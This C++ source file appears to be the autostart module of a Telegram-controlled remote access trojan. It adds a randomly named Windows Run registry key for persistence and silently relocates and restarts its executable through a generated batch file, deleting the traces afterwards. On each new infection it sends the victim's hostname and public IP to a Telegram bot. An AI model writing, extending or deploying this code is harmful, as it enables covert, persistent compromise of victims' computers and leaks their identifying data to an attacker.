#include "autostart.h"

#include <iostream>
#include <Windows.h>
#include <fstream>
#include <string>

#include "globals.h"
#include "telegram.h"
#include "tools.h"

void autostart() {
    std::string path = PATH;
    int find = path.find("$sysdisk$");
    if (find != std::string::npos) {  // replace $sysdisk$ with actual system disk
        std::string npath;
        npath = tools::info::getSysDiskLetter();
        npath += ":" + path.substr(find + std::string("$sysdisk$").size(), path.size());
        path = npath;
    }

    find = path.find("$username$");  // replace $username$ with actual username
    if (find != std::string::npos) {
        path.erase(find, std::string("$username$").size());
        path.insert(find, tools::info::getUsername());
    }

    // if there's no key for autostart in registry yet, it adds one
    std::string s = "reg query HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /f \"" + path + "" + tools::info::getExeName() + "\"";
    if (tools::info::cmdOutput(s.c_str()).find("End of search: 0 match(es) found.") != std::string::npos) {
        std::clog << "Adding new key for autostart\n";
        std::string cmd = "Reg Add  HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v " + tools::randomString(16) + " /t REG_SZ /d \"" + path + "/" + tools::info::getExeName() + "\"";
        system(cmd.c_str());
    }

    if (!tools::info::filExists(path + "\\" + tools::info::getExeName())) {
        telegram::SendText("New user\nUsername: " + tools::info::getHostname() + "\nip: " + tools::info::getPublicIp());

        // create batch script and execute
        std::fstream file;
        file.open("o.bat", std::ios::out);
        file << "TASKKILL /F /IM \"" << tools::info::getExeName() << "\"\n"
            << "move \"" << tools::info::getExeName() << "\"" << " \"" << path << "\"\n"
            << "move \"" << CONFIG_FILENAME << "\"" << " \"" << path << "\"\n"
            << "move " << "\"shitoo\" \"" << path << "\"\n"
            << "cd " << path << std::endl
            << "start " << tools::info::getExeName() << std::endl
            << "exit";
        file.close();

        file.open("shitoo", std::ios::out);
        file << "\"" << tools::info::getDupnixPath().substr(0, tools::info::getDupnixPath().size() - tools::info::getExeName().size()) << "o.bat\"";
        file.close();
        system("start /min o.bat");
    }
    if (tools::info::filExists(path + "\\shitoo")) {  //it's required to delete 'o.bat' from autostart
        std::fstream file;
        std::string path2;
        file.open(path + "\\shitoo", std::ios::in);
        std::getline(file, path2);
        file.close();

        tools::remove(path + "\\" + "shitoo");
        tools::remove(path2);
    }
}
